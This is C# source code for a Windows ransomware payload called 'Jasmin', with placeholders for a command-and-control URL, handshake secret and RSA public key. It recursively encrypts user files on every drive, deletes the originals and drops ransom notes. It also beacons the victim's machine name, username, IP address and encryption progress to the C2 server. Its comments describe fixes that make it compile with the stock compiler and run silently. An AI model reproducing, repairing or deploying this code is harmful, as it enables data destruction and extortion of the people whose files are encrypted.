// Jasmin Windows Payload — Auto-generated
// Compile: csc /target:winexe /out:payload.exe this_file.cs
using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Threading;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Collections.Specialized;
using Microsoft.Win32;

namespace JasminPayload {
class P {
static string C2="{{C2_URL}}";
static string SECRET="{{HANDSHAKE}}";
static string PUB=@"{{RSA_PUBLIC_KEY}}";

// ★ 控制台处理 —— 只"探测"本进程是否已经拥有控制台，绝不 AttachConsole 到父进程。
//   历史缺陷：原实现用 AttachConsole(-1)（ATTACH_PARENT_PROCESS）把自己挂到
//   调用者（PowerShell/终端）的控制台上，收尾再 FreeConsole() 脱离。
//   两个后果都是致命的：
//     ① 载荷被编译成 /target:winexe（GUI 子系统，本无控制台），却强行附身到
//        操作员的终端控制台。当调用它的那个 shell 退出、或它自己 FreeConsole 时，
//        控制台被拆除，Windows 会向所有仍附着的进程投递 CTRL_CLOSE_EVENT ——
//        载荷自己就在这份名单里，于是被就地终止（加密中断、无法回传 beacon），
//        操作员的终端窗口同时被关闭（"运行后终端自动退出"）。
//     ② 即便侥幸没被关掉，也等于把载荷输出混进操作员的交互终端，污染现场。
//   正确做法：GetConsoleWindow() 返回非零 = 本进程本来就带控制台（控制台程序、
//   或从终端前台运行），此时才输出进度；为 0 = 无控制台（GUI/Start-Process），
//   全程静默。既不改动调用者的控制台，也不影响自身执行。
[DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();

// ★ 记录本次运行是否"本来就拥有"控制台（见上），并声明取卷序列号用的 API。
[DllImport("kernel32.dll")]
static extern bool GetVolumeInformation(string lpRootPathName,
  System.Text.StringBuilder lpVolumeNameBuffer,int nVolumeNameSize,
  out uint lpVolumeSerialNumber,out uint lpMaximumComponentLength,
  out uint lpFileSystemFlags,System.Text.StringBuilder lpFileSystemNameBuffer,
  int nFileSystemNameSize);

// ★ 不用 System.Management 的 ManagementClass("Win32_LogicalDisk")：
//   那需要 `csc /r:System.Management.dll`，而投递命令里只有
//   `csc /target:winexe /out:j.exe j.cs` -> 必然 CS0234 编译失败。
//   改用 kernel32!GetVolumeInformation，零额外程序集依赖，语义不变
//   （把每个就绪卷的序列号拼成 SID，与原 WMI 取值一致，均为十进制字符串）。
static string VolumeSerials(){
  var sb=new System.Text.StringBuilder();
  try{
    foreach(var dr in DriveInfo.GetDrives()){
      try{
        if(!dr.IsReady)continue;
        uint ser,ml,fl;
        if(GetVolumeInformation(dr.Name,null,0,out ser,out ml,out fl,null,0))
          sb.Append(ser.ToString());
      }catch{}
    }
  }catch{}
  return sb.ToString();
}

static string[] SKIP_DIRS={@"\Windows",@"\Program Files",@"\Program Files (x86)",
  @"\ProgramData",@"\$Recycle.Bin",@"\System Volume Information",
  @"\Recovery",@"\Boot",@"\EFI"};
static HashSet<string> SKIP_EXT=new HashSet<string>(StringComparer.OrdinalIgnoreCase){
  ".sys",".dll",".exe",".msi",".drv",".ini",".lnk",".bat",".cmd",
  ".rdp",".msc",".cpl",".scr",".efi",".dat",".log",".reg",".mui"};
static string[] EXTS={"*.pptx","*.docx","*.xlsx","*.txt","*.pdf","*.csv",
  "*.jpg","*.jpeg","*.png","*.zip","*.rar","*.7z","*.mp3","*.mp4",
  "*.sql","*.bak","*.html","*.php","*.py","*.java","*.json","*.xml"};

static bool Skip(string p){
  string f=Path.GetFullPath(p);
  if(f.EndsWith(".jasmin",StringComparison.OrdinalIgnoreCase))return true;
  string r=Path.GetPathRoot(f)??@"C:\";
  // 前缀比较必须带路径分隔符边界：否则 "C:\Windows" 会把 "C:\WindowsAzure"、
  // "C:\WindowsSystem32Backup" 这类开头巧合相同的目录一并跳过。加一个结尾 '\'
  // 确保匹配的是完整目录层级（SKIP_DIRS 条目不带尾斜杠时补一个）。
  foreach(var d in SKIP_DIRS){
    string dd=r+(d.TrimStart('\\').TrimEnd('\\'));
    if(!dd.EndsWith("\\",StringComparison.Ordinal))dd+="\\";
    if(f.StartsWith(dd,StringComparison.OrdinalIgnoreCase))return true;
  }
  if(SKIP_EXT.Contains(Path.GetExtension(f)))return true;
  string n=Path.GetFileName(f);
  if(n.StartsWith("ntuser",StringComparison.OrdinalIgnoreCase)||n.Equals("bootmgr",StringComparison.OrdinalIgnoreCase))return true;
  return false;
}

static byte[] AesEnc(byte[] data,byte[] key,byte[] iv){
  using(var a=Aes.Create()){a.KeySize=256;a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;a.Key=key;a.IV=iv;
  using(var ms=new MemoryStream())using(var cs=new CryptoStream(ms,a.CreateEncryptor(),CryptoStreamMode.Write)){
  cs.Write(data,0,data.Length);cs.FlushFinalBlock();return ms.ToArray();}}}

// ── RSA 公钥解析（PEM -> RSAParameters）──
// ★ 不能用 RSA.ImportFromPem()：那是 .NET 5+ 专有 API，本载荷要求由系统自带的
//   旧版 csc.exe（%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe，
//   语言级别 C# 5 / .NET Framework 4.x）直接编译运行，Framework 上根本没有这个方法
//   （CS1061）。这里自行解析 PEM 的 SubjectPublicKeyInfo(DER) 取 modulus/exponent，
//   交给 RSA.ImportParameters()——Framework 4.6+ 与 .NET 5+ 都支持。
//   解析结果已与框架 ImportFromPem 的输出逐字节比对一致，并用平台私钥做过
//   端到端 OAEP-SHA256 加解密验证。
static byte[] _B64Body(string pem){
  var sb=new System.Text.StringBuilder();
  foreach(string ln in pem.Split('\n')){
    string t=ln.Trim();
    if(t.Length==0||t.StartsWith("-----"))continue;
    sb.Append(t);
  }
  return Convert.FromBase64String(sb.ToString());
}
static int _DerLen(byte[] d,ref int p){
  int b=d[p++];
  if(b<0x80)return b;
  int n=b&0x7f,v=0;
  for(int i=0;i<n;i++)v=(v<<8)|d[p++];
  return v;
}
static byte[] _DerTlv(byte[] d,ref int p,int want){
  int tag=d[p++];
  if(tag!=want)throw new Exception("DER tag mismatch");
  int len=_DerLen(d,ref p);
  byte[] v=new byte[len];
  Buffer.BlockCopy(d,p,v,0,len);
  p+=len;
  return v;
}
static RSAParameters ParseRsaPublicKey(string pem){
  byte[] der=_B64Body(pem);
  int p=0;
  byte[] outer=_DerTlv(der,ref p,0x30);      // SubjectPublicKeyInfo
  int q=0;
  _DerTlv(outer,ref q,0x30);                 // AlgorithmIdentifier
  byte[] bits=_DerTlv(outer,ref q,0x03);     // BIT STRING
  int r=1;                                   // 跳过 unused-bits 字节
  byte[] inner=_DerTlv(bits,ref r,0x30);     // RSAPublicKey
  int s=0;
  byte[] n=_DerTlv(inner,ref s,0x02);        // modulus
  byte[] e=_DerTlv(inner,ref s,0x02);        // exponent
  int off=0;                                 // 去掉 DER 正整数的前导 0x00
  while(off<n.Length-1&&n[off]==0)off++;
  if(off>0){byte[] t=new byte[n.Length-off];Buffer.BlockCopy(n,off,t,0,t.Length);n=t;}
  return new RSAParameters{Modulus=n,Exponent=e};
}

static RSAParameters _PUB_PARAMS;
static volatile bool _PUB_READY=false;
static readonly object _PUB_LK=new object();
static void WarmPublicKey(){
  lock(_PUB_LK){ if(!_PUB_READY){ _PUB_PARAMS=ParseRsaPublicKey(PUB); _PUB_READY=true; } }
}
// ★★ 致命缺陷修复 ★★ .NET Framework 的 RSA.Create() 返回 RSACryptoServiceProvider，
//   它只支持 PKCS#1 v1.5 与 OAEP-SHA1；传 RSAEncryptionPadding.OaepSHA256 必然抛
//     CryptographicException: Specified padding mode is not valid for this algorithm.
//   -> Enc() 里 RsaEnc 先抛，9 个文件 0 个加密成功（实测 Server 2019 / .NET 4.8）。
//   实测对照：[1] RSA.Create()->RSACryptoServiceProvider 失败
//             [2] RSACng + OaepSHA256 -> 成功 len=256，产物经平台私钥
//                 openssl -pkeyopt rsa_oaep_md:sha256 解密与原文 48/48 字节全等
//   RSACng 在 Windows / .NET Framework 4.6+ 上始终可用。
//   另：原来对 _PUB_PARAMS 的惰性初始化是多线程数据竞争（并发任务同时进 if），
//   改为加锁 + 主线程预热。
static byte[] RsaEnc(byte[] data){
  if(!_PUB_READY)WarmPublicKey();
  using(var rsa=new RSACng()){rsa.ImportParameters(_PUB_PARAMS);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}

static System.Collections.Generic.Dictionary<string,int> FAILS=new System.Collections.Generic.Dictionary<string,int>();
static void NoteFail(string why){lock(FAILS){int v;FAILS.TryGetValue(why,out v);FAILS[why]=v+1;}}
static void ReportFails(){
  if(FAILS.Count==0)return;
  try{
    int tot=0;foreach(var kv in FAILS)tot+=kv.Value;
    Console.Error.WriteLine("[jasmin] !!! "+tot+" operation(s) failed. Reason breakdown:");
    foreach(var kv in FAILS)Console.Error.WriteLine("[jasmin] !!!   "+kv.Value+" time(s) - "+kv.Key);
    Console.Error.WriteLine("[jasmin] !!! Check: free disk space, whether the volume is read-only/write-protected, file permissions, path length");
  }catch{}
}

static bool Enc(string path){
  try{
    if(Skip(path))return false;
    long flen=0;try{flen=new FileInfo(path).Length;}catch{}
    if(flen==0)return false;                      // 0 字节：跳过（不计失败，但计入进度分母）
    byte[] k=new byte[32],iv=new byte[16];
    using(var rng=RandomNumberGenerator.Create()){rng.GetBytes(k);rng.GetBytes(iv);}
    byte[] km=new byte[48];Buffer.BlockCopy(k,0,km,0,32);Buffer.BlockCopy(iv,0,km,32,16);
    byte[] ek=RsaEnc(km);
    // 流式：明文只读一遍，边算 SHA256 边加密，内存恒定 1MB。
    // 旧实现 File.ReadAllBytes 把整个文件读进内存 —— 受 .NET 数组上限约束，
    // 超过约 2GB 的文件必然失败（OutOfMemory / IOException），且并发时内存成倍增长。
    byte[] buf=new byte[1048576];
    using(var fin=new FileStream(path,FileMode.Open,FileAccess.Read,FileShare.Read))
    using(var fout=new FileStream(path+".jasmin",FileMode.Create,FileAccess.Write))
    using(var sha=SHA256.Create()){
      fout.Write(new byte[32],0,32);              // 先占 SHA256 的位置，最后回填
      using(var aes=Aes.Create()){
        aes.KeySize=256;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;aes.Key=k;aes.IV=iv;
        var cs=new CryptoStream(fout,aes.CreateEncryptor(),CryptoStreamMode.Write);
        int n;
        while((n=fin.Read(buf,0,buf.Length))>0){
          cs.Write(buf,0,n);
          sha.TransformBlock(buf,0,n,buf,0);      // buf 已写出，可原地复用
        }
        sha.TransformFinalBlock(new byte[0],0,0);
        cs.FlushFinalBlock();                     // 完成 PKCS7 padding
        // 不再 Dispose cs：它会连带关闭 fout，而后面还要写 RSA 块并回填摘要
      }
      fout.Write(ek,0,ek.Length);
      fout.Write(BitConverter.GetBytes(ek.Length),0,4);
      fout.Seek(0,SeekOrigin.Begin);
      fout.Write(sha.Hash,0,32);
    }
    File.Delete(path);
    return true;
  }catch(Exception ex){
    string w;
    if(ex is UnauthorizedAccessException)w="Access denied (UnauthorizedAccessException) - cannot write to that directory";
    else if(ex is PathTooLongException)w="Path too long (PathTooLongException)";
    else if(ex is System.IO.DirectoryNotFoundException)w="Directory not found (DirectoryNotFoundException)";
    else if(ex is System.IO.IOException){
      string m=ex.Message;
      if(m.IndexOf("space",StringComparison.OrdinalIgnoreCase)>=0||m.IndexOf("磁盘空间")>=0)
        w="Insufficient disk space (IOException) - each file needs an equally sized .jasmin copy; free space equal to the target data is required";
      else w="IO error (IOException): "+m;
    }
    else w=ex.GetType().Name+": "+ex.Message;
    NoteFail(w);
    // 半成品清理：FileStream(Create) 已把 .jasmin 建出来了，异常时不删就会留下
    // 0 字节/半截的孤儿文件（白占空间，也会被面板的统计当成真实产物）。
    try{ string part=path+".jasmin"; if(File.Exists(part))File.Delete(part); }catch{}
    return false;
  }}

// ── 进度条 ──
static long P_DONE=0, P_BYTES=0, P_OK=0;
static long P_TOTAL=0, P_TOTAL_BYTES=0;
// 每个盘各自需要的空间（加密输出写在源文件同盘，不能拿总量去要求单盘）
static readonly System.Collections.Generic.Dictionary<string,long> P_NEED=new System.Collections.Generic.Dictionary<string,long>(StringComparer.OrdinalIgnoreCase);
// 限制并发：每个任务持有一整个文件的缓冲区，不限并发会在多文件时打爆内存
static readonly SemaphoreSlim P_SEM=new SemaphoreSlim(Math.Max(2,Environment.ProcessorCount));
static long P_LAST_BEACON=0;
static bool P_CONSOLE=false;
static object P_LK=new object();

static string FmtB(long b){
  string[] u={"B","KB","MB","GB","TB","PB"};
  double d=b;int i=0;
  while(d>=1024 && i<5){d/=1024;i++;}
  return i==0?((long)d)+u[i]:d.ToString("0.00")+u[i];
}

static void DrawBar(string cur){
  if(!P_CONSOLE)return;
  double pct = P_TOTAL_BYTES>0 ? (P_BYTES*100.0/P_TOTAL_BYTES)
             : (P_TOTAL>0 ? (P_DONE*100.0/P_TOTAL) : 100.0);
  if(pct>100)pct=100;
  int barw=28, fill=(int)(pct*barw/100);
  string bar=new string('█',fill)+new string('░',barw-fill);
  if(cur!=null && cur.Length>34)cur="…"+cur.Substring(cur.Length-33);
  try{
    int cols=100;try{cols=Console.WindowWidth;}catch{}
    string line=string.Format("  [{0}] {1,5:0.0}%  {2}/{3}  {4}/{5}  {6}",
      bar,pct,P_DONE,P_TOTAL,FmtB(P_BYTES),FmtB(P_TOTAL_BYTES),cur??"");
    if(line.Length>cols-1)line=line.Substring(0,cols-1);
    Console.Error.Write("\r"+line);
    Console.Error.Flush();
  }catch{}
}

static void Tick(string path,long size,bool ok){
  long done,bytes,total,tb;
  lock(P_LK){
    P_DONE++;P_BYTES+=size;if(ok)P_OK++;
    done=P_DONE;bytes=P_BYTES;total=P_TOTAL;tb=P_TOTAL_BYTES;
  }
  DrawBar(path);
  long now=DateTime.UtcNow.Ticks/TimeSpan.TicksPerSecond;  // 兼容 .NET 4.0+（不用 ToUnixTimeSeconds）
  bool fire;
  lock(P_LK){fire=(now-P_LAST_BEACON>=8);if(fire)P_LAST_BEACON=now;}
  if(fire){
    // 周期性回传进度（后台，不阻塞加密）
    int d=(int)done,okc=(int)P_OK,tc=(int)total;
    long by=bytes,tbs=tb;
    System.Threading.Tasks.Task.Run(()=>Beacon(d,by,"","{}",false,tc,tbs));
  }
}

// 面板 os 字段原先取 Environment.OSVersion.Version：不带应用程序清单时拿到的是内核
// 版本（Server 2019 显示成 "Windows 6.2.9200.0"），对取证毫无意义。改读注册表。
static string OSName(){
  try{
    using(var k=Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")){
      if(k!=null){
        string p=(k.GetValue("ProductName")as string)??"";
        string d=(k.GetValue("DisplayVersion")as string)??"";
        if(p.Length>0)return d.Length>0?(p+" ("+d+")"):p;
      }
    }
  }catch{}
  return Environment.OSVersion.VersionString;
}
static string _IP=null;
static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool complete=true,int totalCnt=0,long totalSz=0){
  try{
    string u=Environment.UserName,m=Environment.MachineName;
    string t=DateTime.Now.ToString("HH:mm:ss"),d=DateTime.Today.ToString("dd/MM/yyyy")+", "+DateTime.Now.DayOfWeek;
    // 外网查询只做一次并缓存：进度心跳每 8 秒一次，每次查会拖慢加密、反复外联、并耗尽 socket
    if(_IP==null){try{_IP=new WebClient().DownloadString("https://api.ipify.org").Trim();}catch{_IP="0.0.0.0";}}
    string ip=_IP;
    var kv=new List<KeyValuePair<string,string>>{
      new KeyValuePair<string,string>("machine_name",m),new KeyValuePair<string,string>("computer_user",u),new KeyValuePair<string,string>("systemid",SID),
      new KeyValuePair<string,string>("os",OSName()),new KeyValuePair<string,string>("date",d),new KeyValuePair<string,string>("time",t),
      new KeyValuePair<string,string>("ip",ip),new KeyValuePair<string,string>("location",LOCATION),new KeyValuePair<string,string>("password","RSA_PROTECTED"),new KeyValuePair<string,string>("handshake",SECRET),
      new KeyValuePair<string,string>("encrypted_count",cnt.ToString()),new KeyValuePair<string,string>("encrypted_size",sz.ToString()),
      new KeyValuePair<string,string>("encrypted_types",types),new KeyValuePair<string,string>("encrypted_detail",detail),
      new KeyValuePair<string,string>("is_complete",complete?"1":"0"),
      new KeyValuePair<string,string>("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
      new KeyValuePair<string,string>("total_size",(totalSz>0?totalSz:sz).ToString())};
    // ★ 不用 HttpClient(System.Net.Http)：需要 `csc /r:System.Net.Http.dll`。
    //   改用 System.dll 自带的 WebClient，零额外程序集依赖。
    var nv=new NameValueCollection();
    foreach(var p in kv)nv[p.Key]=p.Value;
    using(var wc=new WebClient()){
      wc.Headers["Content-Type"]="application/x-www-form-urlencoded";
      wc.UploadValues(C2,"POST",nv);
    }
  }catch(Exception ex){if(P_CONSOLE){try{
    Console.Error.WriteLine("[jasmin] !!! Beacon failed: "+C2);
    Console.Error.WriteLine("[jasmin] !!! "+ex.Message);
    Console.Error.WriteLine("[jasmin] !!! Check the C2 URL, the port (this service listens on :8080), and the handshake secret");
  }catch{}}}}

static string SID="";
static string LOCATION=Environment.UserDomainName;   // 原恒为 "?"，面板上零信息量
static string NOTE=@"
{{RANSOM_NOTE}}
";

static System.Collections.Generic.HashSet<string> NOTE_DIRS=new System.Collections.Generic.HashSet<string>();

static void DropNotes(){
  string txt=NOTE.Replace("{sid}",SID);   // 占位符是小写 {sid}，写 {SID} 永远替换不到
  int wrote=0;
  string[] dirs={
    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
  foreach(string d in dirs){
    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("Ransom note drop failed (disk full / read-only / permission): "+ex.GetType().Name);}}
  // 被加密文件所在的每个目录 —— 勒索信必须全部覆盖（原实现只投根目录，用户看不到）
  foreach(string d in NOTE_DIRS){
    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("Ransom note drop failed (disk full / read-only / permission): "+ex.GetType().Name);}}
  foreach(DriveInfo dr in DriveInfo.GetDrives()){
    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch(Exception ex){NoteFail("Ransom note drop failed (drive root / read-only): "+ex.GetType().Name);}}
  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Ransom note dropped in "+wrote+" location(s)");}catch{}}
}

// 容错递归遍历：Directory.EnumerateFiles(..., AllDirectories) 只要碰到一个
// 无权限的目录就整体抛异常，被外层 catch 吞掉后整轮扫描中断 —— 会漏掉大量文件。
// 改为逐目录 try/catch，遇错只跳过该目录。
static void Walk(string dir,System.Action<string> onFile){
  try{foreach(string f in Directory.EnumerateFiles(dir)){try{onFile(f);}catch{}}}catch{}
  try{foreach(string d in Directory.EnumerateDirectories(dir)){Walk(d,onFile);}}catch{}
}

// ── 预扫描：只统计数量与总字节，不保存路径列表 ──
static void ScanTargets(){
  // 只认"自己本来就有"的控制台；绝不附身父进程（见文件头 GetConsoleWindow 注释）
  try{P_CONSOLE=(GetConsoleWindow()!=IntPtr.Zero);}catch{P_CONSOLE=false;}
  foreach(var dr in DriveInfo.GetDrives()){
    try{
      Walk(dr.Name,f=>{
        if(Skip(f))return;
        bool match=false;
        foreach(string ext in EXTS){if(f.EndsWith(ext.Substring(1),StringComparison.OrdinalIgnoreCase)){match=true;break;}}
        if(!match)return;
        long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
        P_TOTAL++;P_TOTAL_BYTES+=fsz;
        long cur;P_NEED.TryGetValue(dr.Name,out cur);P_NEED[dr.Name]=cur+fsz;
      });
    }catch{}
  }
}

static void Preflight(){
  try{
    foreach(var dr in DriveInfo.GetDrives()){
      try{
        if(!dr.IsReady)continue;
        long need;P_NEED.TryGetValue(dr.Name,out need);
        if(need>0&&dr.AvailableFreeSpace<need+need/20){
          if(P_CONSOLE)Console.Error.WriteLine("[jasmin] !!! Preflight warning: "+dr.Name+" has "+FmtB(dr.AvailableFreeSpace)+" free < ~"+FmtB(need)+" required (each file needs an equally sized .jasmin copy; insufficient space causes widespread failures)");
        }
      }catch{}
    }
  }catch{}
}

static void Main(){
  // 主线程预热公钥：既让解析失败时立刻退出（而不是每个文件都失败一遍），
  // 也消除并发任务对 _PUB_PARAMS 惰性初始化的竞态。
  try{ WarmPublicKey(); }catch(Exception ex){ try{ Console.Error.WriteLine("[jasmin] !!! RSA public key unusable: "+ex.Message); }catch{} return; }
  SID=VolumeSerials();   // 见 VolumeSerials()：零依赖取卷序列号

  ScanTargets();
  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Found "+P_TOTAL+" target file(s), "+FmtB(P_TOTAL_BYTES)+" total");}catch{}}
  Preflight();

  long encCount=0,encSize=0;
  var encTypes=new System.Collections.Generic.HashSet<string>();
  var typeSizes=new System.Collections.Generic.Dictionary<string,long[]>();
  var tasks=new System.Collections.Generic.List<System.Threading.Tasks.Task>();
  object lk=new object();

  foreach(var dr in DriveInfo.GetDrives()){
    try{
      Walk(dr.Name,f=>{
        if(Skip(f))return;
        bool match=false;
        foreach(string ext in EXTS){if(f.EndsWith(ext.Substring(1),StringComparison.OrdinalIgnoreCase)){match=true;break;}}
        if(!match)return;
        long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
        string fc=f;long fszc=fsz;
        P_SEM.Wait();                       // 限流：每个任务持有整个文件的缓冲
        tasks.Add(System.Threading.Tasks.Task.Run(()=>{
          try{
            bool ok=Enc(fc);
            Tick(fc,fszc,ok);
            if(ok){lock(lk){encCount++;encSize+=fszc;
              try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
              // ToLower() 受区域设置影响（土耳其 I/ı 会得到错误字符），用 Invariant。
              // ★ 注意：encTypes.Add(e) 必须在注释【之外】—— 早期版本把它误写在
              //   本行注释尾部，导致 encTypes 永远为空，面板 encrypted_types 字段恒为空串。
              string e=Path.GetExtension(fc).ToLowerInvariant();
              encTypes.Add(e);
              if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
              typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
          }finally{P_SEM.Release();}
        }));
        // 任务体只有 try/finally 没有 catch，原来 WaitAll 又在 try 之外：任一任务抛异常
        // 都会冒泡成 AggregateException 直接打死进程（表现为“载荷刚起来就退出”，无任何线索）。
        if(tasks.Count>=2048){try{System.Threading.Tasks.Task.WaitAll(tasks.ToArray());}catch(Exception ex){NoteFail("Task batch failed: "+ex.GetType().Name);}tasks.Clear();}
      });
    }catch{}
  }
  try{System.Threading.Tasks.Task.WaitAll(tasks.ToArray());}catch(Exception ex){NoteFail("Task batch failed (final): "+ex.GetType().Name);}
  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] Encryption complete: "+encCount+"/"+P_TOTAL+" file(s), "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
  ReportFails();

  if(P_TOTAL>0)DropNotes();
  else if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Nothing was encrypted - skipped ransom note drop.");}catch{}}
  // 构建detail JSON（用拼接而非 $"" 插值：旧版 csc(C#5) 不支持插值/目标类型 new）
  var sb=new System.Text.StringBuilder("{");
  bool first=true;
  foreach(var kv2 in typeSizes){
    if(!first)sb.Append(",");
    sb.Append("\""+kv2.Key+"\":{\"count\":"+kv2.Value[0]+",\"size\":"+kv2.Value[1]+"}");
    first=false;}
  sb.Append("}");
  Beacon((int)encCount,encSize,string.Join(",",encTypes),sb.ToString(),true,(int)P_TOTAL,P_TOTAL_BYTES);
  // 不再 FreeConsole：本进程从未 Attach 任何控制台，无需（也不得）脱离它。
}}} // end class, namespace
